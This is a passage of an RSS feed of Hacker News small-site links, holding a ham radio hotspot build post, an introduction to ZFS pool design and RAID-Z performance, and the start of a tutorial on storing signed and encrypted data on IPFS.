philosophyâ€™s technological products, the practical application of certain epistemological conclusions.&nbsp;</p><p><img src="https://cdn-cms.f-static.net/uploads/2029468/2000_5fb4edb79cae4.png"></p><p><strong>3:16:</strong>&nbsp; Youâ€™ve written about <u><em>GÃ¶del</em></u><a href="http://www.bookdepository.com/Incompleteness-Rebecca-Goldstein/9780393327601?ref=grid-view&amp;qid=1605692840648&amp;sr=1-1"><u><em>â€™s incompleteness theorems</em></u></a>. â€¦</p></div></div></div></div></div></div></section></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.3-16am.co.uk/articles/plato-g%C3%B6del-spinoza-ahab">https://www.3-16am.co.uk/articles/plato-g%C3%B6del-spinoza-ahab</a></em></p>]]>
            </description>
            <link>https://www.3-16am.co.uk/articles/plato-g%C3%B6del-spinoza-ahab</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157681</guid>
            <pubDate>Fri, 20 Nov 2020 05:52:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Free Thought and Official Propaganda]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157602">thread link</a>) | @pavelegorkin
<br/>
November 19, 2020 | https://bookpub.club/book/1595536562994x193811667155312740 | <a href="https://web.archive.org/web/*/https://bookpub.club/book/1595536562994x193811667155312740">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bookpub.club/book/1595536562994x193811667155312740</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157602</guid>
            <pubDate>Fri, 20 Nov 2020 05:35:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building My Own LoneStar Electronics Mmdvm Hotspot]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157515">thread link</a>) | @parsecs
<br/>
November 19, 2020 | https://www.kj7nzl.net/blog/building-my-own-lonestar-electronics-mmdvm-hotspot/ | <a href="https://web.archive.org/web/*/https://www.kj7nzl.net/blog/building-my-own-lonestar-electronics-mmdvm-hotspot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content-pane">
  <div>
    
    <p>If youâ€™re reading this post on my new LoneStar Electronics MMDVM hotspot, then you no doubt decided to explore the option of buiding one yourself after noting the price of some of the commercially available hotspots. For example the Zumspot form Ham Radio Outlet retails between $150 - $160, and thatâ€™s not including a case to safeguard it. And letâ€™s not forget about BridgeCom Systems who absolutely rape you on the price of their SkyBridge Hotspot; $299 is rip off.</p>
<p>So, â€œWhat did you build and what did it cost?â€ you ask. I built a simple small form MMDVM hotspot using the LoneStar MMDVM Simplex Board. Combined cost for the build is $140, and if you want the OLED screen you can add on another $10 for a total $150. Now before you start complaining there are Jumbospots on eBay for $75, let me remind you that those are made from questionable components. If you want to purchase one of these, fine but donâ€™t be surprised if it underperforms or completely dies on you. Thatâ€™s the price you pay for not paying full price.</p>
<h2 id="background">Background</h2>
<p>Before we dive into the build, allow me give you a little background of my motivations behind this project and my requirements. To begin with, I believe the cost of commercially available hotspots is too high provided the quality of components used. Second, I didnâ€™t like any of the available options on the market.</p>
<p>I think the OLED screen thatâ€™s attached to most MMDVM boards is ridiculously small. During my research on hotspot cases, I came across the line of cases from C4Labs with either 2.4â€ or 3.5â€ Nextion screens. This intrigued me because they are so much bigger than the OLED screens attached to the MMDVM boards. Bigger is better right?! Wellâ€¦ it turns out the screen is just a novelty and doesnâ€™t provide any functionally beyond displaying which room/reflector/talkgroup youâ€™re connected to and the callsign of the current person speaking. My Yaseu FT3D already does this for me. I asked around and couldnâ€™t find anyone who thought it was a must have feature. Knowing this, I decided that I didnâ€™t need either the OLED or Nextion screen. However, I still want the option to attach a screen to my hotspot should I change my mind in the future.</p>
<p>One of the biggest complaints against hotspots is the accusation that it isnâ€™t real ham radio because most users operate them within ten feet of themselves. Personally I donâ€™t care what youâ€™re opinion on this topic is, the fact of the mater is that Iâ€™m going to be within ten feet of my hotspot when I employ it. With such limited distances between the users and their hotspot, I challenge the need for SMA connectors attached to the MMDVM board. The connectors are just soldered onto the board with nothing more to secure them in place. Luckily the MMDVM board I want to use comes with a ceramic antenna surface mounted onto the board. No need for me to worry about breaking the solder joints on a SMA connector.</p>
<p>With that out of the way, letâ€™s move onto the parts utilized for this build.</p>
<h2 id="parts-list">Parts List</h2>
<h3 id="lonestar-mmdvm-simplex-board">LoneStar MMDVM Simplex Board</h3>
<figure>
    <img src="https://www.kj7nzl.net/img/hotspots/lonestar-mmdvm-simplex-board.webp" alt="LoneStar MMDVM Simplex Board"> <figcaption>
            <p>LoneStar MMDVM Simplex Board</p>
        </figcaption>
</figure>

<p>The most essential component of a hotspot is the MMDVM board. I want the most superior performance and quality for my hotspot, so I donâ€™t want to compromise by buying a cheap MMDVM board. The LoneStar MMDVM Simplex Board, designed by N5BOC David Dennis, is considerable more expensive than other MMDVM boards, however itâ€™s constructed of higher-quality components and has the following features:</p>
<ul>
<li>It has its own dedicated 3.3V regulator and does not pull voltage off of the noisy Raspberry Pi 3.3V line like all other simplex board do.</li>
<li>The board is a four layer PCB with large ground planes for 3.3V and GND sandwiched in the middle of the PCB. This acts as one very large decoupling cap the size of the entire board. Also this isolates signals between top side and bottom side.</li>
<li>All of the Analog RF signals are on the top side only and the high harmonic digital signals are all kept isolated on the bottom side. Making this board much more stable. It should also make it more sensitive on receive.</li>
</ul>
<h3 id="c4labs-jrz-1s-case">C4Labs JRZ-1S Case</h3>
<figure>
    <img src="https://www.kj7nzl.net/img/hotspots/c4labs-case.webp" alt="C4Labs JRZ-1S Case"> <figcaption>
            <p>C4Labs JRZ-1S Case</p>
        </figcaption>
</figure>

<p>I like this case; itâ€™s modest yet does the job very well once itâ€™s completely together. As an added touch of class, I went with the wood inlays. I also sanded the sides of the case with 400 grit sandpaper to give it that frosted glass look. I appreciate how it turned out. The actual case is engineered very well with the components fitting in securely inside. Interestingly enough one layer of the case does include holes drilled in it to support the prongs of an SMA connector. Itâ€™s a thoughtful touch, but Iâ€™m keenly uninterested in trying to find out how well they work.</p>
<h3 id="raspberry-pi-zero-wh">Raspberry Pi Zero WH</h3>
<figure>
    <img src="https://www.kj7nzl.net/img/hotspots/raspberry-pi-zero-wh.webp" alt="Raspberry Pi Zero WH"> <figcaption>
            <p>Raspberry Pi Zero WH</p>
        </figcaption>
</figure>

<p>Nothing extremely exceptional about this other than I purchased it from Adafruit. I went with the Zero WH instead of the Zero W, because I donâ€™t know how to solder very well and didnâ€™t want to ruin the thing. One of these days I need to force myself to learn and become better.</p>
<h2 id="the-finished-build">The Finished Build</h2>
<figure>
    <img src="https://www.kj7nzl.net/img/hotspots/complete-hotspot.webp" alt="Custom LoneStar MMDVM Simplex Board Hotspot"> <figcaption>
            <p>Custom LoneStar MMDVM Simplex Board Hotspot</p>
        </figcaption>
</figure>

<p>Hereâ€™s the finished hotspot. If you look in the top right-hand corner above the heatsink, youâ€™ll recognize the ceramic antenna. With the hotspot located in my basement, Iâ€™m nevertheless able to connect to it will my Yaesu FT3D running 300 mW. Should I want to ever want to attach a screen I can because there are connections present for the Nextion and OLED displays. The only gripe I have remains the location of the micro-USB port on the Pi Zero. If you couldnâ€™t determine from the photo the case is upside down. Well, I canâ€™t do anything about that so, Iâ€™ll have to live with it. Overall Iâ€™m impressed with the build quality of the hotspot and look forward to using it for years to come.</p>

  </div>
</section></div>]]>
            </description>
            <link>https://www.kj7nzl.net/blog/building-my-own-lonestar-electronics-mmdvm-hotspot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157515</guid>
            <pubDate>Fri, 20 Nov 2020 05:18:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to ZFS]]>
            </title>
            <description>
<![CDATA[
Score 151 | Comments 69 (<a href="https://news.ycombinator.com/item?id=25157491">thread link</a>) | @arm
<br/>
November 19, 2020 | https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage.png" data-caption="Truenas Homepage"><img width="696" height="496" src="https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-696x496.png" srcset="https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-696x496.png 696w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-400x285.png 400w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-800x570.png 800w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-1068x761.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-589x420.png 589w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-100x70.png 100w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage.png 1291w" sizes="(max-width: 696px) 100vw, 696px" alt="Truenas Homepage" title="Truenas Homepage"></a><figcaption>Truenas Homepage</figcaption></figure></div>
            <!-- content --><p>ZFS has become increasingly popular in recent years. ZFS on Linux (ZoL) has pushed the envelope and exposed many newcomers to the ZFS fold. iXsystems has adopted the newer codebase, now called <strong>OpenZFS, </strong>into its codebase for TrueNAS CORE. The purpose of this article is to help those of you who have heard about ZFS but have not yet had the opportunity to research it.</p>
<p>Our hope is that we leave you with a better understanding of how and why it works the way it does. Knowledge is key to the decision-making process, and we feel that ZFS is something worth considering for most organizations.<br>
<span id="more-44288"></span></p>
<h2>What is ZFS?</h2>
<p>ZFS is a <strong>filesystem</strong>, but unlike most other file systems it is also the <strong>logical volume manager</strong> or LVM. What that means is ZFS directly controls not only how the bits and blocks of your files are stored on your hard drives, but it also controls how your hard drives are logically arranged for the purposes of RAID and redundancy. ZFS is also classified as a <strong>copy-on-write</strong> or <a href="https://www.ixsystems.com/documentation/freenas/11.2/zfsprimer.html">COW filesystem</a>. This means that ZFS can do some cool things like <strong>snapshots</strong> that a normal filesystem like NTFS could not. A snapshot can be thought of like it sounds, a photograph of how something was at a point in time. How a COW filesystem works, however, has some important implications that we need to discuss.</p>
<figure id="attachment_44997" aria-describedby="caption-attachment-44997"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-322x300.png" alt="The Open ZFS Logo" width="322" height="300" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-322x300.png 322w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-800x746.png 800w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-696x649.png 696w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-450x420.png 450w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_.png 1024w" sizes="(max-width: 322px) 100vw, 322px"><figcaption id="caption-attachment-44997">The Open ZFS Logo</figcaption></figure>
<p>Hard Drives work such that the pieces of your data are stored in <strong>Logical Block Addresses</strong>, or LBAs. ZFS is aware of what LBAs a specific file is stored in. Let us say we need to write a file that is big enough to fit into 3 blocks. We are going to store that file in LBA 1000, 1001, and 1002. This is considered a sequential write, as all of these blocks are stored directly next to each other. For spinning hard drives, this is ideal, as the write head does not have to move off of the track it is on.</p>
<figure id="attachment_23424" aria-describedby="caption-attachment-23424"><a href="https://www.servethehome.com/western-digital-red-pro-10tb-nas-hdd-review/wd-red-10tb-pro-nas-top/" rel="attachment wp-att-23424"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top.jpg" alt="WD Red 10TB Pro NAS Top" width="800" height="786" srcset="https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top.jpg 800w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-305x300.jpg 305w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-696x684.jpg 696w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-427x420.jpg 427w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-23424">WD Red 10TB Pro NAS Top <a href="https://www.servethehome.com/wd-red-smr-vs-cmr-tested-avoid-red-smr/">Use CMR with ZFS, not SMR</a></figcaption></figure>
<p>Now, let us say we make a change to the file and the part that was stored at LBA 1001 needs to be modified. When we write that change, ZFS does not over-write the part of the file that was stored in 1001. Instead, it will write that block to LBA 2001. LBA 1001 will be kept as-is until the snapshot keeping it there expires. This allows us to have both the current version of the file, and the previous one, while <em>only storing the difference.</em> However, the next time we go to read the file back, the read head of our spinning hard drive needs to read LBA 1000, go to the track where LBA 2001 is stored, read that, and then go back to the track where LBA 1002 is stored. This phenomenon is called <strong>fragmentation.</strong></p>
<h2>A Primer on ZFS Pool Design</h2>
<p>To make ZFS pools easier to understand, we are going to focus on using small storage containers as you may have around the house or shop. Before we continue, it is worth defining some terms. A <strong>VDEV, </strong>or virtual device, is a logical grouping of one or more storage devices. A <strong>pool</strong> is then a logically defined group built from 1 or more VDEVs. ZFS is very customizable, and therefore, there are many different types of configurations for VDEVs. You can think of the construction of a ZFS pool by visualizing the following graphic:</p>
<figure id="attachment_45011" aria-describedby="caption-attachment-45011"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-800x521.jpg" alt="Nested Storage Containers" width="696" height="453" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-800x521.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-400x261.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-1536x1001.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-2048x1334.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-696x453.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-1068x696.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-645x420.jpg 645w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45011">Nested Storage Containers</figcaption></figure>
<p>Starting from the smallest container size, we have our drives. We can see that in this visualization we have two drives in each larger container. These two larger containers are our VDEVs. The single largest container, then, is our pool. In this configuration, we would have each pair of drives in a <strong>mirror. </strong>This means that one drive can fail in either (or both!) VDEV and the pool would continue to function in a <strong>degraded</strong> state.</p>
<figure id="attachment_45012" aria-describedby="caption-attachment-45012"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-800x538.jpg" alt="Two Mirrors, Each VDEV with One Bad Drive" width="696" height="468" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-800x538.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-400x269.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-1536x1034.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-2048x1378.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-696x468.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-1068x719.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-624x420.jpg 624w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45012">Two Mirrors, Each VDEV with One Bad Drive</figcaption></figure>
<p>However, if 2 drives in a <strong>single</strong> VDEV, all of the data in our entire pool is lost. There is no redundancy of the pool itself, all redundancy in ZFS is in the VDEV layer. If one <em>VDEV</em> fails, there is not enough information to rebuild the missing data.</p>
<figure id="attachment_45013" aria-describedby="caption-attachment-45013"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-800x559.jpg" alt="Two Mirrors, One VDEV where Both Drives Failed" width="696" height="486" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-800x559.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-400x280.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-1536x1074.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-696x487.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-1068x747.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-601x420.jpg 601w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-100x70.jpg 100w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed.jpg 1991w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45013">Two Mirrors, One VDEV where Both Drives Failed</figcaption></figure>
<p>Next, we need to define what&nbsp;<strong>RAID-Z</strong> is and what the various levels of RAID-Z are. RAID-Z is a way of putting multiple drives together into a VDEV and storing <strong>parity,&nbsp;</strong>or fault tolerance. In ZFS, there is no dedicated â€œparity driveâ€ like in&nbsp;<strong>Unraid</strong>, but it instead stores parity across all of the drives in the VDEV.&nbsp; The amount of parity that is spread across the drives determines the level of RAID-Z. It is in this way more similar to traditional hardware RAID.</p>
<p>What can make RAID-Z a better approach than a mirrored configuration is that it does not matter <em>what&nbsp;</em>drive fails in a RAID-Z. Each drive is an equal partner, whereas, in a mirrored configuration, each mirrored VDEV is a separate entity. This benefit of RAID-Z comes at the cost of performance, however, and a mirrored pool will almost always be <em>faster</em>&nbsp;than RAID Z.</p>
<p><strong>RAID-Z</strong>&nbsp;is similar to a traditional&nbsp;<strong>RAID 5. </strong>In RAID-Z you have one drive worth of parity. In other words, if you lose one drive, your pool will continue to function. For RAID-Z you need a minimum of 3 drives per VDEV. You can have 3, 7, or even 12 drives in a RAID-Z VDEV. The more drives which you add, however, the longer it will take to <strong>resilver,&nbsp;</strong>or rebuild.</p>
<p>This increased time increases the risk of your data, as a second drive failure during this process would destroy your pool. ZFS will resilver while the data is still in use, it is a live recovery. The implication of this is that our disks are working harder than usual during this process, and this can increase the chances of a second drive failure. Your data is still accessible and in production, while it is reading all of the parity data from the existing members of your VDEV and then writing it to the new disk.</p>
<figure id="attachment_45014" aria-describedby="caption-attachment-45014"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--800x569.jpg" alt="A Pool with a Single 3-Disk Raid Z1 VDEV" width="696" height="495" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--800x569.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--400x285.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--1536x1093.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--2048x1458.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--696x495.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--1068x760.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--590x420.jpg 590w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--100x70.jpg 100w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45014">A Pool with a Single 3-Disk Raid-Z VDEV</figcaption></figure>
<p>A RAID-Z2 VDEV is more akin to a RAID 6. In this configuration, 2 drives worth of parity is stored across all of your devices. You can lose up to two drives per VDEV and your pool will still function. Adding more parity drives increases calculations required which means you need more processing performance to operate the array.</p>
<figure id="attachment_45015" aria-describedby="caption-attachment-45015"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-800x551.jpg" alt="A Pool with a Single 4-Disk Raid Z2 VDEV" width="696" height="479" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-800x551.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-400x276.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-1536x1059.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-2048x1412.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-218x150.jpg 218w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-696x480.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-1068x736.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-609x420.jpg 609w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-100x70.jpg 100w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45015">A Pool with a Single 4-Disk Raid Z2 VDEV</figcaption></figure>
<p>Finally, a RAID-Z3 VDEV provides three drives worth of parity, so you can lose up to three drives per VDEV and your pool will still function. <strong>The more drives of parity you add, however, the slower your performance ends up being</strong>. You need a minimum of four but should use at least five drives to build a RAID-Z3 VDEV.</p>
<h2>The Need for Speed</h2>
<p>There are two ways in which we measure speed or <em>fastness</em>,&nbsp;<strong>IOPS,</strong>&nbsp;and&nbsp;<strong>Throughput</strong>. In RAIDZ, more drives will give you more throughput, or the actual read and write speed you see when transferring files. However, if you have ever tried to run multiple file copies in Windows simultaneously, you may have noticed the more you do, the slower it gets. It does not always get slower at a constant rate, the more you try to do disks will get exponentially slower. This is because your disk can only do so many Input/Output Operations per Second, or IOPS.</p>
<p>RAIDZ will scale in&nbsp;<em>throughput</em>&nbsp;with the more disks you add, but it does not scale with&nbsp;<em>IOPS.</em> What that generally means is, RAIDZ is not traditionally the best choice for I/O intensive workloads, as the amount of IOPS is roughly limited to the slowest member of our VDEV if we exclude all of the caching ZFS has. Virtualization, as we are discussing here, is highly dependent on I/O.</p>
<p>Earlier, we discussed that ZFS is a COW filesystem, and because of that it suffers from data fragmentation. There are direct performance implications that stem from that fact.&nbsp;<strong>The more â€œfullâ€ your pool is, the slower it will ultimately get.&nbsp;</strong>Write speeds in ZFS are directly tied to the amount of&nbsp;<em>adjacent</em> free blocks there are to write to. As your pool fills up, and as data fragments, there are fewer and fewer blocks that are directly adjacent to one another. A single large file may span blocks scattered all over the surface of your hard drive. Even though you would expect that file to be a sequential write, it no longer can be if your drive is full.</p>
<figure id="attachment_45006" aria-describedby="caption-attachment-45006"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark.png" alt="Seagate Mobile HDD Crystal Disk Mark Performance" width="482" height="351" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark.png 482w, https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark-400x291.png 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark-324x235.png 324w" sizes="(max-width: 482px) 100vw, 482px"><figcaption id="caption-attachment-45006">Seagate Mobile HDD Crystal Disk Mark Performance</figcaption></figure>
<p>In the above graphic, we can see a Seagate 1TB mobile drive that I tested in CrystalDiskMark. It can do about 130 MB/s of sequential read and writes. We can also see that when we start doing random 4k I/O, the speed falls about <strong>100x</strong>. This is meant to illustrate the performance impact of data fragmentation. Additionally, we can see that the latency for these lookups can take about&nbsp;<strong>half of a second, </strong>and we are limited to about 350 IOPS. In order to be fast, virtualization workloads on traditional hard drives need to have many disks in order to compensate for this slowness. It would not be uncommon to see a pool constructed of 10 or more VDEVs of mirrored drives.</p>
<p>Additionally, there is some wisdom we can <a href="https://www.ixsystems.com/community/threads/the-path-to-success-for-block-storage.81165">borrow from the ZFS community</a>. As your pool fills up, and sequential writes become increasingly difficult to accomplish due to fragmentation, it will slow down in a non-linear way. As a general rule of thumb, at about 50% capacity your pool will be noticeably slower than it was when it was 10% capacity. At about 80%-96% capacity, your pool starts to become very slow, and ZFS will actually change its write algorithm to ensure data integrity, further slowing you down.</p>
<p>This is where SSDs come in. They radically change the game because they work very differently at the physical layer. They do not have read and write heads that are flying around a spinning disk back and forth trying to find your data. With the physical limitations of disk-based drives out of the way, SSDs can read and write non-sequential data <em>much&nbsp;</em>faster. They do not suffer the penalties of these rules nearly as severely, fragmentation does not hurt their performance to the same degree.</p>
<figure><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/05/970-EVO-Plus-250GB-Front.jpg" alt="A Samsung 970 EVO Plus SSD" width="1500" height="997"></figure>
<p>A Samsung 970 EVO Plus SSD</p>
<p>Hard drives have increased in capacity by leaps-and-bounds over the past couple of decades. We have seen hard drives grow from a single gigabyte in capacity and just last year <a href="https://www.servethehome.com/western-digital-volume-production-of-18tb-and-20tb-drives-in-2020/">Western Digital announced</a> that 18 and 20 â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/">https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/</a></em></p>]]>
            </description>
            <link>https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157491</guid>
            <pubDate>Fri, 20 Nov 2020 05:12:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to store signed and encrypted data on IPFS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157017">thread link</a>) | @iamwil
<br/>
November 19, 2020 | https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/ | <a href="https://web.archive.org/web/*/https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Storing authenticated and encrypted data on <a href="https://ipfs.io/">IPFS</a> is a core building block for many Web3 applications, but to date there has not been a standardized way to encode this type of data.</p><p>Without a standard, many developers have been forced to create custom formats for their signed and encrypted data. This has been prohibitive to the openness and interoperability of information stored in IPFS by siloing data to their particular implementation. Another approach to authenticated data has been to put data in IPFS and put the CID of the data in a smart contract on a blockchain, such as <a href="https://ethereum.org/">Ethereum</a>. This is essentially an expensive way of adding a signature on top of the data and persisting the signature record on the blockchain.</p><p>With the introduction of <strong><a href="https://eips.ethereum.org/EIPS/eip-2844">EIP-2844</a>,</strong> a standard that allows wallets to support a few new methods for signing and decrypting data based on <a href="https://www.w3.org/TR/did-core/">DIDs</a> and the <strong><a href="https://github.com/ipld/specs/pull/269"><code>dag-jose</code></a></strong> IPLD codec, we can now simply put authenticated and encrypted data directly into IPFS. In this tutorial, you will learn how you can utilize these primitives with two libraries, <a href="https://github.com/ceramicnetwork/js-did"><code>js-did</code></a> and <a href="https://github.com/3box/3id-connect"><code>3ID Connect</code></a>!</p><h2 id="what-are-dids-and-jose">What are DIDs and JOSE?</h2><p><strong>DIDs</strong> is the W3C standard for <em>Decentralized Identifiers</em>. It specifies a general way of going from a string identifier, e.g. <code>did:3:bafy...</code>, to a <em>DID document</em> which contains public keys for signature verification and key exchange. In most DID methods the document can be updated when keys are rotated for security reasons.</p><p><strong>JOSE</strong> is a standard from <a href="https://www.ietf.org/standards/">IETF</a> which stands for <em>JSON Object Signing and Encryption,</em> and that pretty much explains what it is. There are two main primitives in this standard: JWS (JSON Web Signatures) and JWE (JSON Web Encryption). Both of these formats allow for multiple participants: in JWS there can be one or multiple signatures over the payload, and in JWE there might be one or multiple recipients for the encrypted cleartext.</p><h2 id="building-with-dag-jose-and-eip2844">Building with dag-jose and EIP2844</h2><p>As we have been building out <a href="https://ceramic.network/">Ceramic</a> with <strong>dag-jose</strong> and <strong>EIP-2844</strong> as basic building blocks, we've created a few lower-level tools which allow us to more easily use these technologies. This tutorial will show you how to use these powerful tools directly.</p><p><strong><a href="https://github.com/3box/identity-wallet-js/">IdentityWallet</a></strong> is an implementation of <strong>EIP-2844</strong> using 3ID as the DID method. It can be used standalone as a <em>DID Provider,</em> or more conveniently within the <strong><a href="https://github.com/3box/3id-connect/">3ID Connect</a></strong> library. 3ID Connect allows users to use their Ethereum wallet (support for more blockchains coming soon) to get access to a <em>DID Provider</em>.</p><p><strong><a href="https://github.com/ceramicnetwork/js-did">js-did</a></strong> is a library that allows developers to represent a user in the form of a DID. This is the main interface we're going to be looking at in this tutorial. It allows us to sign data with the currently authenticated user, encrypt data to any user (DID), and decrypt data with the currently authenticated user.</p><h2 id="signed-data-in-ipfs">Signed data in IPFS</h2><p>By using the <strong>dag-jose</strong> IPLD codec we can create data structures that are linked and signed. This is done by creating JSON Web Signatures (JWS) that contain a link to additional data. One of the main problems that the <strong>dag-jose</strong> codec solves is that the payload of a JWS is traditionally encoded as <code>base64url</code> which means that if it contains any IPLD links you can't traverse those links. Instead what we do with <em>DagJWS</em> is enforce the payload to be the bytes of a CID. The codec then 